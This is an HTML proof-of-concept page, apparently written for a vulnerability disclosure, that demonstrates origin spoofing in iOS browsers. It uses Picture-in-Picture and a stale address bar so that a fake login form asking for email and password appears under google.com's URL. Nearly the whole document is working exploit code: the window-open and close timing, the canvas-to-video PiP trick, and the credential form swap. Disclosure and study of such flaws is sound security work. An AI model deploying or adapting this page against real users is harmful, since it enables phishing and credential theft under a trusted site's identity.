<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC: iOS Origin Spoofing with PiP</title>
    <style>
        html { font-family: sans-serif; }
        body {
            overscroll-behavior: contain;
        }
        #instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }
        #canvasElem { display: none; }
        .hide {
            display: none;
        }
    </style>
</head>
<body>
<div id="startContent">
    <h1>PoC: iOS Origin Spoofing due to stale address bar</h1>
    <p id="instructions">Tap to continue</p>
</div>
<div id="spoofContent" class="hide">
    <h1>Spoooo&#128123;oooof</h1>
    <p><b>(ooh, scary!)</b></p>
    <p><i>A wild login form has appeared!</i></p>
    <h2>You must login to continue</h2>
    <form action="/?form" method="get">
        <input id="inputElem" name="email" placeholder="Email">
        <br>
        <input name="password" placeholder="Password" type="password">
        <input type="submit">
    </form>
    <a href="/?forgotpassword">Forgot password?</a>
</div>
<canvas id="canvasElem"></canvas>

<script>
// Set up the URL that will be spoofed
var spoofUrl = 'https://www.google.com/account/about/';
var delayToWaitForScroll = 1500; // Delay for waiting scroll
var newWin;  // Window reference
var targetWidth = 1000;
var targetHeight = 500;

// Function to draw text on canvas (for countdown and instructions)
var drawCanvas = (text) => {
    const ctx = canvasElem.getContext('2d');
    canvasElem.width = targetWidth;
    canvasElem.height = targetHeight;

    ctx.fillStyle = `#fff`;
    ctx.fillRect(0, 0, targetWidth, targetHeight);

    ctx.fillStyle = '#000';
    text = text;
    var fontSize;
    if (text.length == 1) {
        fontSize = 400;
        ctx.font = fontSize + 'px sans-serif';
        ctx.fillText(text, (targetWidth / 2) - 90, (targetHeight / 2) + (fontSize / 2));
    } else if (text.length > 1) {
        var lines = text.split('\n');
        if (lines.length === 2) {
            fontSize = 150;
            ctx.font = fontSize + 'px sans-serif';
            ctx.fillText(lines[0], 50, (targetHeight / 2) + (fontSize / 2) - 50);
            ctx.fillText(lines[1], 50, (targetHeight / 2) + (fontSize / 2) + 80);
        } else {
            fontSize = 170;
            ctx.font = fontSize + 'px sans-serif';
            ctx.fillText(text, 50, (targetHeight / 2) + (fontSize / 2));
        }
    }
}

// Function to create a video element from canvas stream
var createVideo = (canvasElem) => {
    const video = document.createElement('video');
    video.muted = true;
    video.srcObject = canvasElem.captureStream();
    video.play();
    return video;
}

var videoElem = createVideo(canvasElem);
var showingPiP = false;

videoElem.addEventListener('enterpictureinpicture', function(event) {
    showingPiP = true;
    instructions.innerText = 'Tap again to continue';
});

// Draw initial canvas (blank) to initialize
drawCanvas('');

// Replace content when PiP starts
var replaceContents = () => {
    startContent.classList.add('hide');
    spoofContent.classList.remove('hide');
}

// Prevent repeating actions
var ran = false;

window.addEventListener('click', () => {
    if (!showingPiP) {
        videoElem.requestPictureInPicture();  // Request PiP if not already active
        return;
    }
    if (ran) {
        return; // Prevent multiple actions
    }
    ran = true;

    // Open a new window/tab with spoof URL
    newWin = window.open(spoofUrl, '_blank');

    // Countdown with drawings on the canvas
    drawCanvas('3');
    setTimeout(() => {
        drawCanvas('2');
    }, 1000);
    setTimeout(() => {
        drawCanvas('1');
    }, 2000);
    setTimeout(() => {
        drawCanvas('Scroll down\nslowly');
        replaceContents();  // Replace content with login form
        setTimeout(() => {
            newWin.close();  // Close the spoof window after delay
            document.exitPictureInPicture();  // Exit PiP mode
        }, delayToWaitForScroll);  // Delay for scroll action
    }, 3000);
});
</script>

</body>
</html>
